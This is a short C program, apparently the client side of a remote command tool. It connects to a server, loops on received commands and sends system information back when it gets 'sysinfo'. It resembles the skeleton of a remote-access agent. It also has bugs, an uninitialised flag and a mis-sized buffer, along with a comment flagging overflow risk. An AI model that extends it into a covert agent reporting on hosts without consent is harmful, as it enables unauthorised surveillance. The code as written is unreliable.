#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "prompt.h"
#include "network.h"

int main() // Program's entry point.
{
	int socket_fd, is_connected;
	char *recv_data = malloc(256 * sizeof(recv_data)); // Should be changed, fixed size can cause security issues (BOF).

	socket_fd = server_connect();

	if (socket_fd != -1) { // Check if server_connect() succeeded.
		printf("Connected to server!\n"); // for debugging.
		is_connected = 1;
	} 

	while (is_connected) {
		if (receive_data(socket_fd, recv_data) != 0) { // recveive data from socket.
			printf("Command: %s\n", recv_data); // for debugging.

			if (strcmp(recv_data, "sysinfo") == 0) {
				send_data(socket_fd, get_system_info());
			}
		}
		memset(recv_data, '\0', 256);	
	}

	return 0;
}
